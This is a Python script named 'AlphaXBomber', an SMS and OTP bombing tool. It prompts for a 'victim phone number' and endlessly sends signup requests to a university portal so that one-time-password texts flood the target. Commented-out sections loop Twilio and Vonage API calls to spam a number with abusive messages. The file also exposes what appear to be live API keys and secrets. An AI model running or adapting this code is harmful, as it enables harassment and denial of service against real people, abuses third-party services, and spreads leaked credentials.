'''The AlphaXBomber script has been coded by Basant.
You have to pay to use or copy this code, 
but please ensure that proper credit is given to the original author. 
Remember, taking credit for someone else’s work does not make you a good programmer
—acknowledging and respecting the efforts of others does.'''
import os
import sys
import colorama
from colorama import Fore
import webbrowser
import time

#colours
W = Fore.WHITE
R = Fore.RED
Y = Fore.YELLOW
G = Fore.GREEN
B = Fore.BLUE

#detais
print(f"""{G}          -------------------------------------------
         |    >> AUTHOR : BASANT                    |
         |    >> GMAIL : MAIBASANTHOON@GMAIL.COM    |
         |    >> TELEGRAM :                         |
         |    >> INSTAGRAM : ALPHAX.EMPIRE          |
         |                                          |
          --------------------------------------------""")

pas = input("ENTER PASSWORD : ")
if(pas=="basu"):
    pass
else:
    print("INCORRECT PASSWORD")
    exit()
    

if os.name == "nt":
    os.system("cls")
        
else:
    os.system("clear")
      


print(f"""

 █████╗ ██╗     ██████╗ ██╗  ██╗ █████╗     ██╗  ██╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔══██╗██║     ██╔══██╗██║  ██║██╔══██╗    ╚██╗██╔╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████║██║     ██████╔╝███████║███████║     ╚███╔╝     ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██║██║     ██╔═══╝ ██╔══██║██╔══██║     ██╔██╗     ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██║  ██║███████╗██║     ██║  ██║██║  ██║    ██╔╝ ██╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═
                                                                                  Version- 0.00.1
                                                                                  -by Alpha X
                                                                                  """)

print()  
   
print("""            *************************************************************************
            ***   DISCLAMIER : THIS TOOL WAS MADE FOR FUN PURPOSE ONLY !!          **
            ***   USE ONLY FOR LAWFUL, CONSENTED TESTING OR NOTIFICATIONS. ANY     **
            ***   MISUSE(HARRASMENT, SPAM, DENIAL-OF-SERVICE, OR ANY UNLAWFUL      **
            ***   ACTIVITY) IS STRICTLY PROHIBITED                                 **
            ***   --- THE AUTHOR IS NOT LIABLE FOR MISUSE                          **
            *************************************************************************
            
            
            """)





#print("working")

"""
user_msg = input("Enter a message to BOMB : ")
user_no = input("Enter target number with(+91) : ")
"""

#1 twilio (not working)
"""from twilio.rest import Client
accsid =  "AC6f7c602d27ca2565facd55ccb22e017b"
auth_token = "c79c68816c181b3d6846c925148f66e6"
twilio_phone_no = "+14788186483"
target_number = "+9142412131"
interval = 60
client = Client(accsid , auth_token)

def make_call():
    call = client.calls.create(
        twiml='<Response><Say><Hello from Twilio!></Say></Response>',
        to=target_number,
        from_ = twilio_phone_no
        )
    print(f"Call initiated to {target_number}. Call SID: {call.sid}")

             


if __name__ == "__main__":
    while True:
        make_call()
        time.sleep(interval)
    """

#2 vonage part1
import vonage
#from vonage import Sms, Client
import time
"""client = vonage.Client(key="f9515fd5", secret="UmeYpNuYellszry3")
sms = vonage.Sms(client)
to_number = "+919142412131"

while True:
    responseData = sms.send_messages({
        "from" : "VonageAPI",
        "to" : to_number,
        "text" : "teri ma ki chut",
        })
    
    
    if responseData["messages"][0]["status"] == "0":
        print("fucked successfully ")
    else:
        print("code chud gya")
    time.sleep(5)
"""
#part2 (working)
"""

import requests
import time
#api_key = "f9515fd5"
api_key = "2fdd7753"

#api_secret = "UmeYpNuYellszry3"
api_secret = "ged!Z6)xHf"
to_number = user_no

for i in range(10):
    url = "https://rest.nexmo.com/sms/json"
    payload = {
        "api_key" : api_key,
        "api_secret" : api_secret,
        "to" : to_number,
        "from" : "VonageAPI",
        "text" : user_msg,
        }
    response = requests.post(url, data=payload).json()
    message = response["messages"][0]
    if message["status"] == "0":
        print("fucked successfully")
    else:
        print(f"Error: {message['error-text']}")
    
    time.sleep(2)
"""

#twilio part2 (working)
"""
import requests
from requests.auth import HTTPBasicAuth

account_sid = "AC6f7c602d27ca2565facd55ccb22e017b"
auth_token = "c79c68816c181b3d6846c925148f66e6"
to_number = user_no
from_number = "+14788186483"

for i in range(50):
    url = f"https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Messages.json"
    payload = {
        "To" : to_number,
        "From" : from_number,
        "Body" : user_msg,
        }
    resp = requests.post(url, data=payload, auth = HTTPBasicAuth(account_sid, auth_token))
    print("fucked successfully")
    

    
    if message["status"] == "0":
        print("fucked successfully")
    else:
        print(f"Error: {message['error-text']}")
    
    time.sleep(2)
   """
    
#Amity API BOMB 100% working
import requests  
from concurrent.futures import ThreadPoolExecutor, as_completed

import ssl
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager
   
data = input("Enter Victim phone number ( without +91 ):")



phone_numbers = [data]
import requests

def send_otp_amity(phone_number):
    url = "https://portal.amity.edu/NewOnlineForm/Candidate/SignUpPost"

    headers = {
        "Host": "portal.amity.edu",
        "Content-Length": "227",
        "Sec-Ch-Ua-Platform": "\"Linux\"",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Ch-Ua": "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://portal.amity.edu",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://portal.amity.edu/NewOnlineForm/Candidate/SignUp",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=1, i"
    }
    cookies = {
        "first_referrer": "https%3A%2F%2Fwww.google.com%2F",
        "ORG24300": "afe8f879-6fbc-438f-b740-7298d4e58a57",
        "__utma": "30374831.1242311373.1753595261.1753595263.1753595263.1",
        "__utmc": "30374831",
        "__utmz": "30374831.1753595263.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)",
        "__utmt": "1",
        "__utmb": "30374831.1.10.1753595263",
        "_ga": "GA1.2.1242311373.1753595261",
        "_gid": "GA1.2.1655502515.1753595263",
        "ASP.NET_SessionId": "prc50opwtyupxknhr55dcrvc",
        "_ga_5Y1ZH6M81R": "GS2.1.s1753595261$o1$g0$t1753595264$j57$l0$h0",
        "_ga_F0B2MSGHMH": "GS2.1.s1753595261$o1$g0$t1753595264$j57$l0$h0"
    }
    data = {
        "txtCandidateName": "SKKK SM",
        "txtCountryCode": "+91",
        "txtMobile": str(phone_number),
        "txtCandidateEmail": "SKKK@GMAIL.COM",
        "URL": "https://portal.amity.edu/NewOnlineForm/Candidate/SignUp",
        "INTNL": "",
        "SourceReferral": "https://www.google.com/"
    }

    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        if response.status_code == 200:
            print(f"Amity OTP Sent Successfully to {phone_number}")
        else:
            print(f"Amity OTP Failed [{response.status_code}] for {phone_number}")
    except Exception as e:
        print(f"Amity API Error: {e}")
        
        
def send_otp(phone_number):
    with ThreadPoolExecutor(max_workers=20) as executor:  # Adjust workers for concurrency
        future_to_api = {

            executor.submit(send_otp_amity, phone_number): "AMITY", #working

        }
        
        for future in as_completed(future_to_api):
            api_name = future_to_api[future]
            try:
                future.result()
                print(f"{api_name} OTP sent successfully for {phone_number}.")
            except Exception as e:
                print(f"{api_name} encountered an error: {e}")
                
                
while True:
    
    # Send OTPs to all phone numbers
    for number in phone_numbers:
        send_otp(number)
        # time.sleep(2)
if __name__ == "__main__":
    main()




    

    

        

                                                                                                                    
 #bandwidth
#TrueDialog
#Notifyre:
#Textedly:
#ClickSend
#
#
 

 